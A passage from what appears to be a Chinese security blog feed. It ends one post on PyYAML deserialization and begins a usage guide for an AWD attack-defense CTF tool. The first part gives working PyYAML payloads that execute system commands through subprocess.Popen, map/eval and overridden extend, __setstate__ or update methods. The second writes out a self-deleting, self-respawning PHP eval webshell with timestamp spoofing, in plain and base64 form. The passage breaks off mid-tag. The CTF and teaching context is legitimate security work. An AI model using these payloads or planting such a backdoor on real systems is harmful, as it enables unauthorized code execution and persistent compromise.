class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_python_instance</span>(<span class="hljs-params">self, suffix, node,</span><br><span class="hljs-params">        args=<span class="hljs-literal">None</span>, kwds=<span class="hljs-literal">None</span>, newobj=<span class="hljs-literal">False</span>, unsafe=<span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args:<br>        args = []<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> kwds:<br>        kwds = &#123;&#125;<br>    cls = self.find_python_name(suffix, node.start_mark)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (unsafe <span class="hljs-keyword">or</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>)):<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python instance&quot;</span>, node.start_mark,<br>                <span class="hljs-string">&quot;expected a class, but found %r&quot;</span> % <span class="hljs-built_in">type</span>(cls),<br>                node.start_mark)<br>    <span class="hljs-keyword">if</span> newobj <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>):<br>        <span class="hljs-keyword">return</span> cls.__new__(cls, *args, **kwds)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> cls(*args, **kwds)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_python_name</span>(<span class="hljs-params">self, name, mark, unsafe=<span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> name:<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python object&quot;</span>, mark,<br>                <span class="hljs-string">&quot;expected non-empty name appended to the tag&quot;</span>, mark)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>        module_name, object_name = name.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        module_name = <span class="hljs-string">&#x27;builtins&#x27;</span><br>        object_name = name<br>    <span class="hljs-keyword">if</span> unsafe:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">__import__</span>(module_name)<br>        <span class="hljs-keyword">except</span> ImportError <span class="hljs-keyword">as</span> exc:<br>            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python object&quot;</span>, mark,<br>                    <span class="hljs-string">&quot;cannot find module %r (%s)&quot;</span> % (module_name, exc), mark)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> module_name <span class="hljs-keyword">in</span> sys.modules:<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python object&quot;</span>, mark,<br>                <span class="hljs-string">&quot;module %r is not imported&quot;</span> % module_name, mark)<br>    module = sys.modules[module_name]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(module, object_name):<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python object&quot;</span>, mark,<br>                <span class="hljs-string">&quot;cannot find %r in the module %r&quot;</span><br>                % (object_name, module.__name__), mark)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, object_name)<br></code></pre></td></tr></table></figure><p>可以看到引入了 unsafe ，并且有如下的规则</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (unsafe <span class="hljs-keyword">or</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>))<br><span class="hljs-comment">#  module.name 必须是一个类</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> module_name <span class="hljs-keyword">in</span> sys.modules<br><span class="hljs-comment"># 限制了导入的module必须在 sys.modules 中</span><br></code></pre></td></tr></table></figure><p><strong>方法一：</strong></p><p>最简单的方式就是遍历 sys.modules 字典，找一个满足条件的模块中能执行命令的类</p><p>比如 subprocess.Popen</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">yaml.load(<span class="hljs-string">&quot;!!python/object/apply:subprocess.Popen [whoami]&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>方法二：</strong></p><p>借助 map 来触发函数执行</p><p>例如<code>map(eval, [&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;])</code></p><blockquote><p>需要注意在python2中会直接返回结果，但是在python3中返回的就是一个map对象，需要用一些函数来遍历</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python3</span><br><span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br><span class="hljs-built_in">set</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br><span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br><span class="hljs-built_in">frozenset</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br><span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br></code></pre></td></tr></table></figure><p>转换成yaml格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> yaml<br><br><span class="hljs-comment"># python2</span><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br><br><span class="hljs-comment"># python3</span><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:tuple</span><br><span class="hljs-string">- !!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:frozenset</span><br><span class="hljs-string">- !!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:bytes</span><br><span class="hljs-string">- !!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>这里存在一个问题，在使用<code>!!python/object/new</code>的情况下只能使用 tuple，bytes 等函数来遍历map对象，用 list 或者 set 都不行（当然在 !!python&#x2F;object&#x2F;apply 下没有问题）</p><p>这是因为上文提到的 python&#x2F;object&#x2F;new 与 python&#x2F;object&#x2F;apply 的不同之处导致的</p><p>当调用 construct_python_object_apply 时会使 newobj 为 true，那么条件就成立了，就会调用 cls.__new__(cls, *args, **kwds)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> newobj <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>):<br>    <span class="hljs-keyword">return</span> cls.__new__(cls, *args, **kwds)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> cls(*args, **kwds)<br></code></pre></td></tr></table></figure><p>因为这几个函数的底层实现并不相同，所以部分函数不能使用 __new__ 来传值</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/python/python-pyyaml-5.png"></p><p><strong>其他方法：</strong></p><p>继续看 !!python&#x2F;object&#x2F;new 的代码，可以发现除了调用 make_python_instance 外还有三个判断，这三个判断在之前的payload中并没有使用，因为并没有传对应的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> state:<br>    self.set_python_instance_state(instance, state)<br><span class="hljs-keyword">if</span> listitems:<br>    instance.extend(listitems)<br><span class="hljs-keyword">if</span> dictitems:<br>    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dictitems:<br>        instance[key] = dictitems[key]<br></code></pre></td></tr></table></figure><p>首先是当 listitems 存在，就会触发 instance 下的 extend 方法。那么我们可以创建一个类，在类中添加一个名为 extend 的方法，然后重写成 eval，就相当于 instance.eval(listitems)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 利用 type 创建一个新的类</span><br>a = <span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;rce&quot;</span>, (), &#123;<span class="hljs-string">&quot;extend&quot;</span>: <span class="hljs-built_in">eval</span>&#125;)<br>a.extend(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure><p>转成YAML</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">args:</span><br><span class="hljs-string">  - rce</span><br><span class="hljs-string">  - !!python/tuple []</span><br><span class="hljs-string">  - &#123;&quot;extend&quot;: !!python/name:eval &#125;</span><br><span class="hljs-string">listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/python/python-pyyaml-6.png"></p><p>state 的利用方式也是同样的，通过修改 <code>__setstate__</code> 达到执行函数的目的（与pickle中的利用__setstate__执行命令类似）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_python_instance_state</span>(<span class="hljs-params">self, instance, state</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(instance, <span class="hljs-string">&#x27;__setstate__&#x27;</span>):<br>        instance.__setstate__(state)<br>    <span class="hljs-keyword">else</span>:<br>        slotstate = &#123;&#125;<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(state, <span class="hljs-built_in">tuple</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(state) == <span class="hljs-number">2</span>:<br>            state, slotstate = state<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(instance, <span class="hljs-string">&#x27;__dict__&#x27;</span>):<br>            instance.__dict__.update(state)<br>        <span class="hljs-keyword">elif</span> state:<br>            slotstate.update(state)<br>        <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> slotstate.items():<br>            <span class="hljs-built_in">setattr</span>(<span class="hljs-built_in">object</span>, key, value)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;rce&quot;</span>, (), &#123;<span class="hljs-string">&quot;__setstate__&quot;</span>: <span class="hljs-built_in">eval</span>&#125;)<br>a.__setstate__(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure><p>转为YAML</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">args:</span><br><span class="hljs-string">  - rce</span><br><span class="hljs-string">  - !!python/tuple []</span><br><span class="hljs-string">  - &#123;&quot;__setstate__&quot;: !!python/name:eval &#125;</span><br><span class="hljs-string">state: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/python/python-pyyaml-7.png"></p><p><strong>总结：有能调用实例方法的地方，那么就可以构造一个实例，用恶意函数去替换，来执行我们的代码</strong></p><p>比如 set_python_instance_state 下的 slotstate.update(state) 也可以rce</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">  args: []</span><br><span class="hljs-string">  state: !!python/tuple</span><br><span class="hljs-string">    - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">    - !!python/object/new:type</span><br><span class="hljs-string">      args:</span><br><span class="hljs-string">        - exp</span><br><span class="hljs-string">        - !!python/tuple []</span><br><span class="hljs-string">        - &#123;&quot;update&quot;: !!python/name:exec , &quot;items&quot;: !!python/name:list &#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br><span class="hljs-comment"># 另一种写法，用 staticmethod 代替 type</span><br>yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:str</span><br><span class="hljs-string">    args: []</span><br><span class="hljs-string">    state: !!python/tuple</span><br><span class="hljs-string">      - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">      - !!python/object/new:staticmethod</span><br><span class="hljs-string">        args: []</span><br><span class="hljs-string">        state:</span><br><span class="hljs-string">          update: !!python/name:eval</span><br><span class="hljs-string">          items: !!python/name:list</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>参考文章：<br><a href="https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/">SecMap - 反序列化（Python）</a><br><a href="https://tttang.com/archive/1885/">python反序列化详解</a><br><a href="https://tttang.com/archive/1782/">Python pickle反序列化浅析</a><br><a href="https://goodapple.top/archives/1069">Pickle反序列化</a><br><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml">SecMap - 反序列化（PyYAML）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;python的序列化和反序列化&quot;&gt;&lt;a href=&quot;#python的序列化和反序列化&quot; class=&quot;headerlink&quot; title=&quot;python的序列化和反序列化&quot;&gt;&lt;/a&gt;python的序列化和反序列化&lt;/h1&gt;&lt;p&gt;与PHP，Java类似，python</summary>
      
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="反序列化" scheme="https://www.dr0n.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="python" scheme="https://www.dr0n.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>awd工具开发&amp;使用说明</title>
    <link href="https://www.dr0n.top/posts/48fe3a65/"/>
    <id>https://www.dr0n.top/posts/48fe3a65/</id>
    <published>2023-12-07T06:00:00.000Z</published>
    <updated>2024-03-01T15:14:55.710Z</updated>
    
    <content type="html"><![CDATA[<h2 id="目标生成"><a href="#目标生成" class="headerlink" title="目标生成"></a>目标生成</h2><blockquote><p>使用场景：在目标扫描前如果没有下发靶机地址列表，则需要自己生成一份去扫描</p></blockquote><h3 id="ip段生成"><a href="#ip段生成" class="headerlink" title="ip段生成"></a>ip段生成</h3><blockquote><p>使用场景：裁判给了一个C段（192.168.10.0），所有队伍的靶机都在这个C段中，具体ip需要自己发现</p></blockquote><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-1.png"></p><p>输入<code>192.168.10.*</code>(用*占位)即可在程序当前运行目录下生成一个<code>ip.txt</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">192.168.10.1:8080<br>192.168.10.2:8080<br>192.168.10.3:8080<br>192.168.10.4:8080<br>192.168.10.5:8080<br>...<br>...<br>192.168.10.251:8080<br>192.168.10.252:8080<br>192.168.10.253:8080<br>192.168.10.254:8080<br>192.168.10.255:8080<br></code></pre></td></tr></table></figure><h3 id="单ip多端口生成"><a href="#单ip多端口生成" class="headerlink" title="单ip多端口生成"></a>单ip多端口生成</h3><blockquote><p>使用场景：某些小型比赛或训练赛，为了节约资源将所有靶机映射在同一台服务器的不同端口上</p></blockquote><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-2.png"></p><p>然会会在程序运行目录下生成<code>ip.txt</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">192.168.100.103:10000<br>192.168.100.103:10001<br>192.168.100.103:10002<br>192.168.100.103:10003<br>...<br>...<br>192.168.100.103:10297<br>192.168.100.103:10298<br>192.168.100.103:10299<br>192.168.100.103:10300<br><br></code></pre></td></tr></table></figure><h3 id="bugku专用"><a href="#bugku专用" class="headerlink" title="bugku专用"></a>bugku专用</h3><blockquote><p>使用场景：针对线上的域名生成 例如 192-168-1-X.pvp3553.bugku.cn</p></blockquote><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-3.png"></p><p>按以下规则输入即可,<code>&#123;&#125;</code>中表示生成的范围，以<code>-</code>分割</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">192-168-1-&#123;1-255&#125;.pvp3553.bugku.cn<br>192-168-&#123;1-2&#125;-&#123;1-255&#125;.pvp3553.bugku.cn<br></code></pre></td></tr></table></figure><p>在当前目录下生成<code>ip.txt</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">192-168-1-1.pvp3553.bugku.cn<br>192-168-1-2.pvp3553.bugku.cn<br>192-168-1-3.pvp3553.bugku.cn<br>192-168-1-4.pvp3553.bugku.cn<br>...<br>...<br>192-168-1-252.pvp3553.bugku.cn<br>192-168-1-253.pvp3553.bugku.cn<br>192-168-1-254.pvp3553.bugku.cn<br>192-168-1-255.pvp3553.bugku.cn<br></code></pre></td></tr></table></figure><h2 id="目标扫描"><a href="#目标扫描" class="headerlink" title="目标扫描"></a>目标扫描</h2><blockquote><p>使用场景：自己生成靶机地址或通过平台下载后，进行特征扫描来识别题目</p></blockquote><h3 id="web靶机扫描"><a href="#web靶机扫描" class="headerlink" title="web靶机扫描"></a>web靶机扫描</h3><p>先打开自己的web靶机，输入网页上可以看到的特征即可</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-4.png"></p><h3 id="pwn靶机扫描"><a href="#pwn靶机扫描" class="headerlink" title="pwn靶机扫描"></a>pwn靶机扫描</h3><p>pwn靶机也是同理，先连上自己的看看会输出什么就填什么</p><p>注意文件中的地址不能带上<code>http</code>，需要是<code>ip:port</code>格式</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-5.png"></p><h2 id="写入不死马"><a href="#写入不死马" class="headerlink" title="写入不死马"></a>写入不死马</h2><blockquote><p>使用场景：发现题目的默认后门或者rce点后写入不死马</p></blockquote><h3 id="默认马"><a href="#默认马" class="headerlink" title="默认马"></a>默认马</h3><p><strong>在可以rce的参数后加<code>*</code>，多个参数用&amp;连接</strong></p><p>可写路径：一般默认为空，当某些靶机的web根目录<strong>不可写</strong>时需要手动指定，例如指定写入到<code>/var/www/html/xxx/</code>（使用绝对路径）</p><p>Get传参后门：</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-6.png"></p><p>Post传参后门：</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-7.png"></p><p>同时会在当前目录下生成一个<code>shell.txt</code>来保存记录</p><h3 id="自定义不死马"><a href="#自定义不死马" class="headerlink" title="自定义不死马"></a>自定义不死马</h3><blockquote><p>使用场景：想写入自己自定义的不死马</p></blockquote><p>当勾选这个功能后，可以自定义不死马的内容</p><p>例如一个不死马如下，密码是123456，访问的文件名是.666.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.666.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;e10adc3949ba59abbe56e057f20f883e&quot;)&#123;@eval($_POST[&quot;aa&quot;]);&#125; ?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .666.php&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用前需要base64编码一次（工具页中提供base64加解密功能）</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PD<span class="hljs-number">9</span>waHAKICAgIGl<span class="hljs-symbol">nbm9</span>yZV<span class="hljs-number">91</span>c<span class="hljs-number">2</span>VyX<span class="hljs-number">2</span>Fib<span class="hljs-number">3</span>J<span class="hljs-number">0</span>KHRydWUpOwogICAgc<span class="hljs-number">2</span>V<span class="hljs-number">0</span>X<span class="hljs-number">3</span>RpbWVfbGltaXQoMCk<span class="hljs-number">7</span>CiAgICB<span class="hljs-number">1</span>bmxpbmsoX<span class="hljs-number">19</span>GSUxFX<span class="hljs-number">18</span>pOwogICAgJGZpbGUgPSA<span class="hljs-symbol">nLjY2</span><span class="hljs-symbol">Ni5</span>waHA<span class="hljs-symbol">nOwogICAgJGNvZGUgPSAnPD9</span>waHAgaWYobWQ<span class="hljs-number">1</span>KCRfR<span class="hljs-number">0</span>VUWyJwYX<span class="hljs-symbol">NzIl0</span>pPT<span class="hljs-number">0</span>iZTEwYWRjMzk<span class="hljs-number">0</span>OWJh<span class="hljs-symbol">NTlhYmJlNTZlMDU3</span>ZjIwZj<span class="hljs-name">g4</span><span class="hljs-name">M2</span>UiKXtAZXZhbCgkX<span class="hljs-number">1</span>BPU<span class="hljs-number">1</span>RbImFhIl<span class="hljs-number">0</span>p<span class="hljs-meta">O30</span>gPz<span class="hljs-number">4</span><span class="hljs-symbol">nOwogICAgd2</span>hpbGUgKDEpewogICAgICAgIGZpbGVfcHV<span class="hljs-number">0</span>X<span class="hljs-number">2</span><span class="hljs-symbol">NvbnRlbnRzKCRmaWxlLCRjb2</span>RlKTsKICAgICAgICBzeX<span class="hljs-symbol">N0</span>ZW<span class="hljs-number">0</span>oJ<span class="hljs-number">3</span>RvdW<span class="hljs-symbol">NoIC1</span>tIC<span class="hljs-number">1</span>kICIyMDE<span class="hljs-number">4</span>LTEyLTAxIDA<span class="hljs-number">5</span>OjEwOjEyIiAu<span class="hljs-symbol">NjY2</span>L<span class="hljs-symbol">nBocCcpOwogICAgICAgIHVzbGVlcCgxKTsKICAgIH0</span>KPz<span class="hljs-number">4</span>=<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-8.png"></p><h3 id="随机文件名"><a href="#随机文件名" class="headerlink" title="随机文件名"></a>随机文件名</h3><blockquote><p>使用场景：防止其他队伍监控流量进行蹭车</p></blockquote><p>勾选后写入的shell的文件名，密码，连接参数随机产生</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-9.png"></p><p>会在当前目录下生成<code>random.txt</code>来保存shell记录</p><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><blockquote><p>使用场景：通过不死马或者其他漏洞点进行命令执行</p></blockquote><h3 id="一般shell执行命令"><a href="#一般shell执行命令" class="headerlink" title="一般shell执行命令"></a>一般shell执行命令</h3><p><img 